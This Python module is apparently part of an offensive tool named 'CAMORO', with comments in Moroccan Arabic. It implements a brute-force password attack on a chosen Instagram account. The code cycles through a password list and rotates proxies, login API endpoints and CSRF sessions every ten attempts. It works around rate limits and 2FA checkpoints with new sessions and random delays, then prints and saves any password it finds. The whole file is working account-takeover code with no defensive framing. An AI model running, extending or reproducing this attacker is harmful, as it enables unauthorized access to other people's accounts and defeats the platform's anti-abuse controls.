#!/usr/bin/env python3
import json
import os
import random
import sys
import threading
import time
from datetime import datetime

from .banner import C, G, R, RE, Y
from .config import LOGIN_ENDPOINTS, OUTPUT_DIR, ROTATE_EVERY
from .proxy_rotator import ProxyRotator
from .session_manager import InstagramSession


class BruteAttacker:
    """
    مرحلة 3:
    - يجرب كلمات السر
    - كل ROTATE_EVERY (10) محاولات: proxy جديد + endpoint API جديد + session/CSRF جديد
    - ملي تلقاها: يطبع الباسورد ويحفظ
    """

    def __init__(self, username, passwords, proxy_rotator=None):
        self.username = (username or "").strip().lstrip("@")
        self.passwords = [p for p in passwords if p]
        self.total = len(self.passwords)
        self.proxy_rotator = proxy_rotator or ProxyRotator()
        self.found = False
        self.correct_password = None
        self.attempted = 0
        self.lock = threading.Lock()
        self.stop = threading.Event()
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self.results_file = os.path.join(
            OUTPUT_DIR,
            f"{self.username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
        )
        self.stats = {
            "start_time": datetime.now().isoformat(),
            "attempts": 0,
            "rate_limited": 0,
            "network_errors": 0,
            "checkpoints": 0,
            "rotations": 0,
            "found_password": None,
            "username": self.username,
        }

    def start_attack(self, threads=1, callback=None):
        # threads=1 أنظف ضد الحظر. زيد غير إلا عندك بزاف ديال proxies
        threads = max(1, min(3, int(threads)))
        print(f"\n{R} ⚡ CAMORO BRUTE FORCE ENGINE{RE}")
        print(f"{C}{'=' * 50}{RE}")
        print(f"{G}[*] Target: {self.username}{RE}")
        print(f"{G}[*] Total passwords: {self.total}{RE}")
        print(f"{G}[*] Already tested: 0{RE}")
        print(f"{G}[*] Remaining: {self.total}{RE}")
        print(f"{Y}[*] Rotate every: {ROTATE_EVERY} passwords (proxy + API){RE}")
        print(f"{Y}[*] Delay: 3-5s between attempts{RE}")
        print(f"{C}{'=' * 50}{RE}\n")

        if self.total == 0:
            print(f"{R}[!] No passwords{RE}")
            return None

        if threads == 1:
            self._worker(self.passwords, 0, callback)
        else:
            from concurrent.futures import ThreadPoolExecutor, as_completed

            chunk = max(1, self.total // threads)
            chunks = [
                self.passwords[i * chunk : (i + 1) * chunk if i < threads - 1 else self.total]
                for i in range(threads)
            ]
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futs = [ex.submit(self._worker, ch, i, callback) for i, ch in enumerate(chunks)]
                for fu in as_completed(futs):
                    if self.found:
                        self.stop.set()
                        break
                    try:
                        fu.result()
                    except Exception as e:
                        print(f"{R}[!] worker: {e}{RE}")

        self._save()
        if self.found:
            print(f"\n{G}{'=' * 60}{RE}")
            print(f"{G}[+] ✅ PASSWORD FOUND{RE}")
            print(f"{G}[+] Username : {self.username}{RE}")
            print(f"{G}[+] Password : {self.correct_password}{RE}")
            print(f"{G}[+] Saved    : {self.results_file}{RE}")
            print(f"{G}{'=' * 60}{RE}\n")
        else:
            print(f"\n{Y}[!] Password not found in list{RE}")
        return self.correct_password

    def _new_session(self):
        proxy = self.proxy_rotator.get_next_proxy(force=True)
        endpoint = random.choice(LOGIN_ENDPOINTS)
        print(f"{Y}[*] Initializing session...{RE}")
        print(f"{Y}[*] Proxy : {proxy or 'DIRECT'}{RE}")
        print(f"{Y}[*] API   : {endpoint}{RE}")
        sess = InstagramSession(proxy=proxy, endpoint=endpoint)
        csrf = (sess.csrf_token or "")[:12]
        print(f"{G}[✓] Session initialized, CSRF: {csrf}...{RE}")
        with self.lock:
            self.stats["rotations"] += 1
        return sess, proxy

    def _worker(self, passwords, wid, callback=None):
        session, proxy = self._new_session()
        local = 0
        t0 = time.time()

        print(f"{C}[*] Starting attack...{RE}")
        print(f"{Y}[!] Testing passwords with rotation every {ROTATE_EVERY} ...{RE}\n")

        for pwd in passwords:
            if self.stop.is_set() or self.found:
                break

            # دوران كل 10
            if local > 0 and local % ROTATE_EVERY == 0:
                try:
                    session.reset_session(
                        proxy=self.proxy_rotator.get_next_proxy(force=True),
                        endpoint=random.choice(LOGIN_ENDPOINTS),
                    )
                    proxy = session.proxy
                    with self.lock:
                        self.stats["rotations"] += 1
                    print(
                        f"{Y}[*] Rotated #{self.stats['rotations']} | "
                        f"proxy={proxy or 'DIRECT'} | api=...{session.endpoint[-24:]}{RE}"
                    )
                except Exception as e:
                    print(f"{R}[!] rotate fail: {e}{RE}")
                    session, proxy = self._new_session()
                    local = 0

            with self.lock:
                self.attempted += 1
                self.stats["attempts"] += 1
                n = self.attempted

            ok, resp = session.attempt_login(self.username, pwd)
            local += 1
            self.proxy_rotator.report_attempt()

            elapsed = max(time.time() - t0, 0.001)
            speed = n / elapsed
            pct = (n / self.total) * 100.0
            eta = int((self.total - n) / speed) if speed > 0 else 0
            bar_len = 28
            filled = int(bar_len * n / self.total)
            bar = "█" * filled + "░" * (bar_len - filled)
            short = (pwd[:18] + "…") if len(pwd) > 18 else pwd

            # سطر تقدم (كي الصورة)
            sys.stdout.write(
                f"\r{C}{pct:5.1f}%{RE} | {n}/{self.total} | "
                f"{bar} | {speed:.2f} pwd/s | ETA {eta}s | {short}   "
            )
            sys.stdout.flush()

            if ok:
                with self.lock:
                    self.found = True
                    self.correct_password = pwd
                    self.stats["found_password"] = pwd
                self.stop.set()
                print()  # newline after progress
                return

            err = resp.get("error", "") if isinstance(resp, dict) else ""
            if err == "rate_limited":
                with self.lock:
                    self.stats["rate_limited"] += 1
                self.proxy_rotator.mark_blocked(proxy)
                print(f"\n{R}[!] Rate limit — rotating proxy/API...{RE}")
                session, proxy = self._new_session()
                local = 0
                time.sleep(random.uniform(8, 15))
            elif err == "checkpoint_required":
                with self.lock:
                    self.stats["checkpoints"] += 1
                print(f"\n{Y}[!] Checkpoint/2FA wall — rotating...{RE}")
                session, proxy = self._new_session()
                local = 0
                time.sleep(random.uniform(5, 10))
            elif err == "network_error":
                with self.lock:
                    self.stats["network_errors"] += 1
                time.sleep(random.uniform(3, 6))
                if local % 3 == 0:
                    session, proxy = self._new_session()
                    local = 0

            if callback and n % 50 == 0:
                callback(n, self.total, self.stats)

            time.sleep(self.proxy_rotator.get_random_delay())

        print()
        try:
            session.reset_session()
        except Exception:
            pass

    def _save(self):
        self.stats["end_time"] = datetime.now().isoformat()
        self.stats["found"] = self.found
        self.stats["correct_password"] = self.correct_password
        self.stats["total_passwords_tested"] = self.total
        with open(self.results_file, "w", encoding="utf-8") as f:
            json.dump(self.stats, f, indent=2, ensure_ascii=False)
